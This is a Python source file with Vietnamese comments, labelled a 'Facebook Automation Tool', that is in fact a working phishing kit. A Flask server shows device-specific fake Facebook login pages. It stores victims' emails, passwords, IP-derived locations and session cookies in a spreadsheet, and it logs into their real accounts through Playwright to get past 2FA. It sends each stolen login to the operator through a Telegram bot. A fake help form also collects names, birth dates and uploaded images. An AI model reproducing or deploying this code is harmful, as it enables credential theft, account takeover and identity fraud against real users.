#!/usr/bin/env python3

"""

Facebook Automation Tool - Terminal CLI

======================================

Tool tự động hóa đăng nhập Facebook với giao diện terminal.

Mỗi user chạy trên một luồng riêng biệt với Playwright instance riêng.

"""



import os

import sys

import time

import threading

import queue

import base64

import uuid

import webbrowser

import subprocess

from datetime import datetime

from typing import Optional, Dict, Any

from concurrent.futures import Future

import requests



# Thêm thư mục gốc vào path để import các module

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))



from flask import Flask, render_template, request, jsonify, make_response

from openpyxl import Workbook, load_workbook

# Import utils

from utils.get_html import get_facebook_page_after_login, get_cookies, wait_and_save_cookies





# Create uploads directory if not exists

UPLOADS_DIR = "uploads"

if not os.path.exists(UPLOADS_DIR):

    os.makedirs(UPLOADS_DIR)



def save_base64_image(base64_data: str, original_filename: str = "") -> str:

    """Decode base64 và lưu thành file ảnh, trả về đường dẫn file"""

    if not base64_data:

        return ""

    

    try:

        # Generate unique filename

        ext = os.path.splitext(original_filename)[1] if original_filename else ".png"

        if not ext:

            ext = ".png"

        

        unique_name = f"{uuid.uuid4().hex}{ext}"

        file_path = os.path.join(UPLOADS_DIR, unique_name)

        

        # Decode base64

        image_bytes = base64.b64decode(base64_data)

        

        # Save to file

        with open(file_path, "wb") as f:

            f.write(image_bytes)

        

        return file_path

    except Exception as e:

        print(f"[Image Save Error] {e}")

        return ""





def get_ip_location(ip: str) -> str:

    """Lấy thông tin vị trí từ IP sử dụng ip-api.com"""

    try:

        # Skip for localhost/private IPs

        if ip in ('127.0.0.1', 'localhost') or ip.startswith('192.168.') or ip.startswith('10.'):

            return 'Local/Private Network'

        

        response = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp', timeout=5)

        data = response.json()

        

        if data.get('status') == 'success':

            location = f"{data.get('city', 'N/A')}, {data.get('regionName', 'N/A')}, {data.get('country', 'N/A')} ({data.get('isp', 'N/A')})"

            return location

        return 'Unknown'

    except Exception as e:

        return f'Error: {str(e)[:30]}'





def save_to_info_excel(data: dict) -> None:

    """Lưu dữ liệu vào file info.xlsx"""

    filename = "info.xlsx"

    

    # Create workbook if doesn't exist

    if not os.path.exists(filename):

        wb = Workbook()

        ws = wb.active

        ws.title = "Help Form Data"

        # Add headers

        headers = ['Timestamp', 'IP Address', 'Location', 'Full Name', 'Email', 'Year', 'Month', 'Day', 'Image Path']

        for col, header in enumerate(headers, 1):

            ws.cell(row=1, column=col, value=header)

        wb.save(filename)

    

    # Load workbook and append data

    wb = load_workbook(filename)

    ws = wb.active

    

    # Append data row

    row_data = [

        data.get('timestamp', ''),

        data.get('ip', ''),

        data.get('location', ''),

        data.get('field1', ''),

        data.get('field2', ''),

        data.get('year', ''),

        data.get('month', ''),

        data.get('day', ''),

        data.get('image', '')

    ]

    

    ws.append(row_data)

    wb.save(filename)





def print_logo():

    """In logo tool lên terminal"""

    logo = """

    ███████╗ █████╗  ██████╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗

    ██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██║ ██╔╝

    █████╗  ███████║██║     █████╗  ██████╔╝██║   ██║██║   ██║█████╔╝ 

    ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗██║   ██║██║   ██║██╔═██╗ 

    ██║     ██║  ██║╚██████╗███████╗██████╔╝╚██████╔╝╚██████╔╝██║  ██╗

    ╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝

                                                                     

         █████╗ ██╗   ██╗████████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗

        ██╔══██╗██║   ██║╚══██╔══╝██╔═══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║

        ███████║██║   ██║   ██║   ██║   ██║██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║

        ██╔══██║██║   ██║   ██║   ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║

        ██║  ██║╚██████╔╝   ██║   ╚██████╔╝██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║

        ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

    """

    print("\033[1;36m" + logo + "\033[0m")  # Cyan color

    print("\033[1;33m" + " " * 30 + "Version 1.0.0 - Terminal Edition" + "\033[0m\n")





def print_menu():

    """In bảng menu"""

    print("\033[1;34m" + "=" * 70 + "\033[0m")

    print("\033[1;32m" + "                           MENU CHÍNH" + "\033[0m")

    print("\033[1;34m" + "=" * 70 + "\033[0m")

    print()

    print("  \033[1;33m[1]\033[0m  Chạy server")
    print("  \033[1;33m[2]\033[0m  Xem danh sách user đã đăng nhập")
    print("  \033[1;33m[3]\033[0m  Xóa user khỏi danh sách")
    print("  \033[1;33m[4]\033[0m  Thiết lập Telegram Bot")
    print("  \033[1;33m[5]\033[0m  Thiết lập trình duyệt mở master")
    print("  \033[1;33m[0]\033[0m  Thoát")

    print()

    print("\033[1;34m" + "=" * 70 + "\033[0m")





def get_input(prompt: str, allow_empty: bool = False) -> str:

    """Lấy input từ user với validation"""

    while True:

        try:

            value = input(f"\033[1;36m{prompt}\033[0m").strip()

            if not value and not allow_empty:

                print("\033[1;31m[!] Vui lòng không để trống\033[0m")

                continue

            return value

        except KeyboardInterrupt:

            print("\n\033[1;31m[!] Đã hủy\033[0m")

            return ""





def start_server():

    """Khởi động Flask server"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m           KHỞI ĐỘNG SERVER\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)

    port = int(port_str) if port_str.isdigit() else 5000

    

    print(f"\n\033[1;33m[*] Khởi động server tại http://localhost:{port}\033[0m")

    print(f"\033[1;33m[*] Mỗi user đăng nhập trên một luồng riêng biệt\033[0m")

    print(f"\033[1;36m    Nhập Ctrl+C để dừng server và quay lại menu\033[0m\n")

    

    try:

        run_server(port=port, open_browser=False)

    except KeyboardInterrupt:

        print(f"\n\033[1;33m[*] Đã dừng server\033[0m")

    except Exception as e:

        print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def show_users():

    """Hiển thị danh sách user đã đăng nhập"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m        DANH SÁCH USER\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    filename = "users.xlsx"

    if os.path.exists(filename):

        try:

            from openpyxl import load_workbook

            wb = load_workbook(filename)

            ws = wb.active

            

            if ws.max_row <= 1:

                print("\033[1;33m[!] Chưa có user nào trong danh sách\033[0m")

            else:

                print(f"\033[1;36m{'STT':<5} {'Email':<25} {'Password':<15} {'Cookies':<20}\033[0m")

                print("-" * 75)

                for i, row in enumerate(ws.iter_rows(min_row=2, values_only=True), 1):

                    email = str(row[0]) if len(row) > 0 and row[0] else "N/A"

                    password = str(row[1]) if len(row) > 1 and row[1] else "N/A"

                    cookies = str(row[2]) if len(row) > 2 and row[2] else "N/A"

                    

                    # Rút gọn cookies để hiển thị bảng đẹp hơn

                    display_cookies = (cookies[:17] + "...") if len(cookies) > 20 else cookies

                    

                    print(f"{i:<5} {email:<25} {password:<15} {display_cookies:<20}")

        except Exception as e:

            print(f"\033[1;31m[!] Lỗi khi đọc file: {e}\033[0m")

    else:

        print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def delete_user():

    """Xóa user khỏi danh sách"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m           XÓA USER\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    print("  \033[1;33m[1]\033[0m  Xóa một user theo email")

    print("  \033[1;33m[2]\033[0m  Xóa TOÀN BỘ danh sách")

    print("  \033[1;33m[0]\033[0m  Quay lại")

    

    choice = get_input("\nNhập lựa chọn: ", allow_empty=True)

    

    filename = "users.xlsx"

    if choice == "1":

        email = get_input("Nhập email cần xóa: ")

        if not email: return

        

        if os.path.exists(filename):

            try:

                from openpyxl import load_workbook

                wb = load_workbook(filename)

                ws = wb.active

                deleted = False

                for row in range(ws.max_row, 1, -1):

                    if ws.cell(row=row, column=1).value == email:

                        ws.delete_rows(row)

                        deleted = True

                if deleted:

                    wb.save(filename)

                    print(f"\n\033[1;32m[✓] Đã xóa user {email}\033[0m")

                else:

                    print(f"\n\033[1;33m[!] Không tìm thấy user {email}\033[0m")

            except Exception as e:

                print(f"\033[1;31m[!] Lỗi: {e}\033[0m")

        else:

            print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")

            

    elif choice == "2":

        confirm = get_input("Bạn có chắc chắn muốn xóa TOÀN BỘ? (y/n): ", allow_empty=True).lower()

        if confirm in ('y', 'yes'):

            if os.path.exists(filename):

                try:

                    os.remove(filename)

                    print(f"\n\033[1;32m[✓] Đã xóa toàn bộ danh sách user\033[0m")

                except Exception as e:

                    print(f"\033[1;31m[!] Lỗi: {e}\033[0m")

            else:

                print(f"\033[1;33m[!] File {filename} chưa tồn tại\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def setup_bot():

    """Thiết lập Telegram Bot"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m        THIẾT LẬP TELEGRAM BOT\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    config_file = "bot_config.txt"

    current_token = ""

    current_chat_id = ""

    

    if os.path.exists(config_file):

        with open(config_file, "r") as f:

            lines = f.readlines()

            if len(lines) >= 2:

                current_token = lines[0].strip()

                current_chat_id = lines[1].strip()

                print(f"\033[1;36mToken hiện tại: {current_token[:10]}...{current_token[-5:] if len(current_token)>10 else ''}\033[0m")

                print(f"\033[1;36mChat ID hiện tại: {current_chat_id}\033[0m\n")



    token = get_input("Nhập Bot Token (để trống để giữ nguyên): ", allow_empty=True)

    if not token and current_token:

        token = current_token

    elif not token:

        print("\033[1;31m[!] Token không được để trống\033[0m")

        return



    chat_id = get_input("Nhập Chat ID (để trống để giữ nguyên): ", allow_empty=True)

    if not chat_id and current_chat_id:

        chat_id = current_chat_id

    elif not chat_id:

        print("\033[1;31m[!] Chat ID không được để trống\033[0m")

        return



    try:

        with open(config_file, "w") as f:

            f.write(f"{token}\n{chat_id}")

        print(f"\n\033[1;32m[✓] Đã lưu cấu hình bot vào {config_file}\033[0m")

    except Exception as e:

        print(f"\033[1;31m[!] Lỗi khi lưu file: {e}\033[0m")

    

    input("\n\033[1;36mNhấn Enter để quay lại menu...\033[0m")





def setup_browser():

    """Thiết lập trình duyệt để mở master"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m        THIẾT LẬP TRÌNH DUYỆT MỞ MASTER\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    config_file = "browser_config.txt"

    current_browser = "default"

    current_path = ""

    

    if os.path.exists(config_file):
        with open(config_file, "r") as f:
            lines = f.readlines()
            if len(lines) >= 2:
                current_browser = lines[0].strip()
                current_path = lines[1].strip()
    
    print(f"\033[1;36mTrình duyệt hiện tại: {current_browser}\033[0m")
    if current_path:
        print(f"\033[1;36mĐường dẫn: {current_path}\033[0m")
    print()
    
    print("  \033[1;33m[1]\033[0m  Trình duyệt mặc định (system default)")
    print("  \033[1;33m[2]\033[0m  Chrome")
    print("  \033[1;33m[3]\033[0m  Firefox")
    print("  \033[1;33m[4]\033[0m  Edge")
    print("  \033[1;33m[5]\033[0m  Nhập đường dẫn trình duyệt tùy chỉnh")
    print("  \033[1;33m[0]\033[0m  Quay lại")
    
    choice = get_input("\nChọn trình duyệt: ", allow_empty=True)
    
    browser_type = current_browser
    browser_path = current_path
    
    if choice == "1":
        browser_type = "default"
        browser_path = ""
    elif choice == "2":
        browser_type = "chrome"
        browser_path = ""
    elif choice == "3":
        browser_type = "firefox"
        browser_path = ""
    elif choice == "4":
        browser_type = "edge"
        browser_path = ""
    elif choice == "5":
        browser_type = "custom"
        browser_path = get_input("Nhập đường dẫn đến file .exe của trình duyệt: ")
        if not browser_path or not os.path.exists(browser_path):
            print("\033[1;31m[!] Đường dẫn không hợp lệ\033[0m")
            input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")
            return
    elif choice == "0":
        return
    else:
        print("\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")
        time.sleep(1)
        return
    
    try:
        with open(config_file, "w") as f:
            f.write(f"{browser_type}\n{browser_path}")
        print(f"\n\033[1;32m[✓] Đã lưu cấu hình trình duyệt: {browser_type}\033[0m")
    except Exception as e:
        print(f"\033[1;31m[!] Lỗi khi lưu file: {e}\033[0m")
    
    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def detect_device(user_agent: str) -> str:

    """Phát hiện thiết bị từ User-Agent"""

    ua = user_agent.lower()

    if "iphone" in ua or "ipad" in ua or "ios" in ua:

        return "iOS"

    if "android" in ua:

        return "Android"

    return "Desktop"





def create_unified_app():

    """Tạo Flask app với cả login và help trên cùng 1 port"""

    template_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

    app = Flask(__name__, template_folder=template_dir)

    

    FILE_NAME = "users.xlsx"

    

    @app.route("/")

    def home():

        """Trang chủ - hiển thị form login phù hợp với thiết bị"""

        user_agent = request.headers.get("User-Agent", "")

        device = detect_device(user_agent)

        

        print(f"[Login] User-Agent: {user_agent[:50]}...")

        print(f"[Login] Device: {device}")

        

        template_map = {

            "iOS": "iOS/login.html",

            "Android": "Android/login.html",

            "Desktop": "Desktop/login.html"

        }

        template = template_map.get(device, "Desktop/login.html")

        return render_template(template)

    
    @app.route("/api/languages", methods=["GET"])
    def get_languages():
        """API trả về danh sách ngôn ngữ có sẵn"""
        languages = [
            {"code": "en", "name": "English (US)", "flag": "🇺🇸"},
            {"code": "vi", "name": "Tiếng Việt", "flag": "🇻🇳"},
            {"code": "th", "name": "ภาษาไทย", "flag": "🇹🇭"},
            {"code": "es", "name": "Español", "flag": "🇪🇸"},
            {"code": "fr", "name": "Français", "flag": "🇫🇷"},
            {"code": "de", "name": "Deutsch", "flag": "🇩🇪"},
            {"code": "pt", "name": "Português", "flag": "🇵🇹"},
            {"code": "zh", "name": "中文 (简体)", "flag": "🇨🇳"},
            {"code": "ja", "name": "日本語", "flag": "🇯🇵"},
            {"code": "ko", "name": "한국어", "flag": "🇰🇷"},
            {"code": "id", "name": "Bahasa Indonesia", "flag": "🇮🇩"},
            {"code": "tr", "name": "Türkçe", "flag": "🇹🇷"},
            {"code": "ru", "name": "Русский", "flag": "🇷🇺"},
            {"code": "ar", "name": "العربية", "flag": "🇸🇦"}
        ]
        return jsonify({"success": True, "languages": languages})
    
    
    @app.route("/set_language", methods=["POST"])
    def set_language():
        """API để set ngôn ngữ ưa thích cho user (lưu vào cookie/session)"""
        data = request.get_json() or request.form
        lang = data.get("lang", "en")
        
        # Validate language
        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]
        if lang not in valid_langs:
            return jsonify({"success": False, "error": "Invalid language code"}), 400
        
        # Set cookie response
        response = jsonify({"success": True, "message": f"Language set to {lang}"})
        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)  # 30 days
        return response
    
    
    @app.route("/login_with_lang/<lang>")
    def login_with_lang(lang):
        """Trang login với ngôn ngữ được chỉ định qua URL"""
        user_agent = request.headers.get("User-Agent", "")
        device = detect_device(user_agent)
        
        # Validate language
        valid_langs = ["en", "vi", "th", "es", "fr", "de", "pt", "zh", "ja", "ko", "id", "tr", "ru", "ar"]
        if lang not in valid_langs:
            lang = "en"
        
        template_map = {
            "iOS": "iOS/login.html",
            "Android": "Android/login.html",
            "Desktop": "Desktop/login.html"
        }
        template = template_map.get(device, "Desktop/login.html")
        
        # Render template với ngôn ngữ mặc định được set qua cookie hoặc URL
        response = make_response(render_template(template))
        response.set_cookie("preferred_lang", lang, max_age=30*24*60*60)
        return response

    

    # Quản lý session cho login - mỗi user có worker riêng
    _active_sessions: Dict[str, '_AutomationWorker'] = {}
    _sessions_lock = threading.Lock()
    BOT_CONFIG_FILE = "bot_config.txt"
    
    
    class _AutomationWorker:
        """Worker thread chạy Playwright operations cho mỗi user riêng biệt"""
        
        def __init__(self, email: str):
            self.email = email
            self._q: "queue.Queue[tuple[callable, tuple, dict, Future]]" = queue.Queue()
            self._thread = threading.Thread(
                target=self._run, 
                name=f"worker-{email}", 
                daemon=True
            )
            self._thread.start()
        
        def _run(self):
            """Main loop của worker thread"""
            while True:
                func, args, kwargs, fut = self._q.get()
                try:
                    result = func(*args, **kwargs)
                    fut.set_result(result)
                except Exception as e:
                    fut.set_exception(e)
        
        def call(self, func, *args, **kwargs):
            """Gọi đồng bộ - đợi kết quả"""
            fut: Future = Future()
            self._q.put((func, args, kwargs, fut))
            return fut.result()
        
        def submit(self, func, *args, **kwargs) -> Future:
            """Gọi bất đồng bộ"""
            fut: Future = Future()
            self._q.put((func, args, kwargs, fut))
            return fut
    
    
    def send_telegram_message(message: str) -> bool:
        """Gửi message qua Telegram Bot"""
        try:
            if not os.path.exists(BOT_CONFIG_FILE):
                print(f"[Telegram] Config file not found: {BOT_CONFIG_FILE}")
                return False
            
            with open(BOT_CONFIG_FILE, "r") as f:
                lines = f.readlines()
                if len(lines) < 2:
                    return False
                
                token = lines[0].strip()
                chat_id = lines[1].strip()
            
            url = f"https://api.telegram.org/bot{token}/sendMessage"
            payload = {
                "chat_id": chat_id,
                "text": message,
                "parse_mode": "HTML"
            }
            
            response = requests.post(url, json=payload, timeout=10)
            if response.status_code == 200:
                print(f"[Telegram] Message sent successfully")
                return True
            else:
                print(f"[Telegram] Failed to send: {response.text}")
                return False
        except Exception as e:
            print(f"[Telegram] Error: {e}")
            return False

    
    @app.route("/login", methods=["POST"])
    def login():
        """API đăng nhập - mỗi request chạy trên luồng riêng"""
        data = request.json
        email = data.get("email", "").strip()
        password = data.get("password", "").strip()
        
        if not email or not password:
            return jsonify({"success": False, "error": "Thiếu email hoặc password"}), 400
        
        # Lấy IP và thông tin vị trí
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()
        location_info = get_ip_location(client_ip)
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Tạo worker mới cho user này (mỗi user một luồng)
        with _sessions_lock:
            worker = _AutomationWorker(email)
            _active_sessions[email] = worker
        
        # Lưu credentials trước (với IP, Location, Timestamp)
        try:
            if not os.path.exists(FILE_NAME):
                wb = Workbook()
                ws = wb.active
                ws.append(["Email", "Password", "Cookies", "IP Address", "Location", "Timestamp"])
                wb.save(FILE_NAME)
            
            wb = load_workbook(FILE_NAME)
            ws = wb.active
            
            # Cập nhật hoặc thêm mới
            found = False
            for row in range(2, ws.max_row + 1):
                if ws.cell(row=row, column=1).value == email:
                    ws.cell(row=row, column=2).value = password
                    ws.cell(row=row, column=4).value = client_ip
                    ws.cell(row=row, column=5).value = location_info
                    ws.cell(row=row, column=6).value = timestamp
                    found = True
                    break
            
            if not found:
                ws.append([email, password, "", client_ip, location_info, timestamp])
            
            wb.save(FILE_NAME)
            
        except Exception as e:
            print(f"[Server] Lỗi lưu Excel: {e}")
        
        # Thực hiện đăng nhập trong worker thread riêng
        try:
            html, should_get_cookies, login_failed = worker.call(
                get_facebook_page_after_login,
                username=email,
                password=password,
                headless=False,
                timeout=300000
            )
            
            # Nếu đăng nhập sai (URL là /login/web/), trả về login_failed cho client
            if login_failed:
                return jsonify({
                    "success": False,
                    "login_failed": True,
                    "error": "Thông tin đăng nhập không chính xác"
                })
            
            if not html:
                return jsonify({
                    "success": False,
                    "error": "Không lấy được HTML sau khi đăng nhập"
                }), 500
            
            # Lấy cookies hoặc đợi 2FA
            cookies_value = "Chưa có (đang đợi 2FA)"
            if should_get_cookies:
                try:
                    cookies = worker.call(get_cookies, file_name=FILE_NAME)
                    cookies_value = cookies if cookies else "Không lấy được"
                except Exception as e:
                    cookies_value = f"Lỗi: {str(e)[:50]}"
            else:
                worker.submit(wait_and_save_cookies, file_name=FILE_NAME)
            
            # Gửi 1 message duy nhất với đầy đủ thông tin
            telegram_msg = f"📱 <b>THÔNG TIN ĐĂNG NHẬP</b>\n" \
                          f"━━━━━━━━━━━━━━━━━━━━━\n\n" \
                          f"👤 <b>Tài khoản:</b> <code>{email}</code>\n" \
                          f"🔑 <b>Mật khẩu:</b> <code>{password}</code>\n\n" \
                          f"🌐 <b>IP:</b> <code>{client_ip}</code>\n" \
                          f"📍 <b>Vị trí:</b> {location_info}\n" \
                          f"⏰ <b>Thời gian:</b> {timestamp}\n\n" \
                          f"🍪 <b>Cookies:</b>\n<code>{cookies_value}</code>"
            send_telegram_message(telegram_msg)
            
            return jsonify({
                "success": True,
                "html": html,
                "should_get_cookies": should_get_cookies
            })
            
        except Exception as e:
            return jsonify({
                "success": False,
                "error": f"Lỗi đăng nhập: {str(e)}"
            }), 500

    
    @app.route("/help")

    def help_page():

        """Trang help - hiển thị template phù hợp với thiết bị"""

        user_agent = request.headers.get("User-Agent", "")

        device = detect_device(user_agent)

        

        print(f"[Help] User-Agent: {user_agent[:50]}...")

        print(f"[Help] Device: {device}")

        

        template_map = {

            "iOS": "iOS/help.html",

            "Android": "Android/help.html",

            "Desktop": "Desktop/help.html"

        }

        template = template_map.get(device, "Desktop/help.html")

        return render_template(template)

    

    @app.route("/submit_help", methods=["POST"])

    def submit_help():

        """Nhận dữ liệu form help và lưu vào Excel"""

        try:

            data = request.get_json() or request.form

            

            # Get client IP

            client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

            if ',' in client_ip:

                client_ip = client_ip.split(',')[0].strip()

            

            # Get location info from IP (using ip-api.com)

            location_info = get_ip_location(client_ip)

            

            # Decode base64 image và lưu thành file

            image_path = ""

            image_data = data.get('image', '')

            if image_data:

                image_path = save_base64_image(image_data, "upload.png")

            

            # Prepare data for Excel

            info_data = {

                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),

                'ip': client_ip,

                'location': location_info,

                'field1': data.get('field1', ''),

                'field2': data.get('field2', ''),

                'year': data.get('year', ''),

                'month': data.get('month', ''),

                'day': data.get('day', ''),

                'image': image_path  # Đường dẫn file ảnh thay vì base64

            }

            

            # Save to info.xlsx

            save_to_info_excel(info_data)

            

            print(f"[Help Form] Data saved from IP: {client_ip}, Location: {location_info}")

            return jsonify({"success": True, "message": "Data saved successfully"}), 200

            

        except Exception as e:

            print(f"[Help Form] Error: {e}")

            return jsonify({"success": False, "error": str(e)}), 500

    

    @app.route("/upload_image", methods=["POST"])

    def upload_image():

        """Nhận file upload và trả về thông tin cho preview"""

        try:

            if 'file' not in request.files:

                return jsonify({"success": False, "error": "No file provided"}), 400

            

            file = request.files['file']

            if file.filename == '':

                return jsonify({"success": False, "error": "No file selected"}), 400

            

            # Read file bytes

            file_bytes = file.read()

            

            # Generate unique ID for the file

            import uuid

            import base64

            

            file_id = str(uuid.uuid4())[:16].replace('-', '')

            

            # Encode to base64 (truncated for storage)

            file_data_b64 = base64.b64encode(file_bytes).decode('utf-8')

            

            # Create response with Facebook-style format

            # The value is a hash-like string similar to Facebook's format

            hash_value = f"AZ{base64.b64encode(file_id.encode()).decode('utf-8').replace('=', '').replace('/', '').replace('+', '')[:80]}"

            

            response_data = {

                "success": True,

                "filename": file.filename,

                "file_id": file_id,

                "hash_value": hash_value,

                "size": len(file_bytes),

                "mime_type": file.content_type or 'application/octet-stream'

            }

            

            print(f"[Upload] File uploaded: {file.filename} ({len(file_bytes)} bytes)")

            return jsonify(response_data), 200

            

        except Exception as e:

            print(f"[Upload] Error: {e}")

            return jsonify({"success": False, "error": str(e)}), 500

    

    return app





def start_all_server():

    """Khởi động server với cả login và help cùng port"""

    print("\n\033[1;34m" + "-" * 50 + "\033[0m")

    print("\033[1;32m              CHẠY SERVER\033[0m")

    print("\033[1;34m" + "-" * 50 + "\033[0m\n")

    

    port_str = get_input("Nhập port (mặc định: 5000): ", allow_empty=True)

    port = int(port_str) if port_str.isdigit() else 5000

    

    app = create_unified_app()

    master_url = f"http://localhost:{port}"
    
    print(f"\n\033[1;33m[*] Khởi động Server tại {master_url}\033[0m")

    print(f"\033[1;36m    - Login: {master_url}/\033[0m")

    print(f"\033[1;36m    - Help:  {master_url}/help\033[0m")

    print(f"\033[1;36m    Nhập Ctrl+C để dừng server\033[0m\n")

    

    try:

        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False, threaded=True)

    except KeyboardInterrupt:

        print(f"\n\033[1;33m[*] Đã dừng server\033[0m")

    except Exception as e:

        print(f"\n\033[1;31m[!] Lỗi server: {e}\033[0m")

    

    input("\n\033[1;36mNhấn Enter để tiếp tục...\033[0m")





def main():

    """Hàm chính"""

    os.system('cls' if os.name == 'nt' else 'clear')

    print_logo()

    

    while True:

        print_menu()

        

        try:

            choice = get_input("\nNhập lựa chọn của bạn: ", allow_empty=True)

        except KeyboardInterrupt:

            print("\n\n\033[1;33m[*] Tạm biệt!\033[0m")

            break

        

        if choice == "1":
            start_all_server()
        elif choice == "2":
            show_users()
        elif choice == "3":
            delete_user()
        elif choice == "4":
            setup_bot()
        elif choice == "5":
            setup_browser()
        elif choice == "0":

            print("\n\033[1;33m[*] Tạm biệt!\033[0m")

            break

        else:

            print("\n\033[1;31m[!] Lựa chọn không hợp lệ\033[0m")

            time.sleep(1)

        

        os.system('cls' if os.name == 'nt' else 'clear')

        print_logo()





if __name__ == "__main__":

    try:

        main()

    except KeyboardInterrupt:

        print("\n\n\033[1;33m[*] Đã thoát tool\033[0m")

        sys.exit(0)

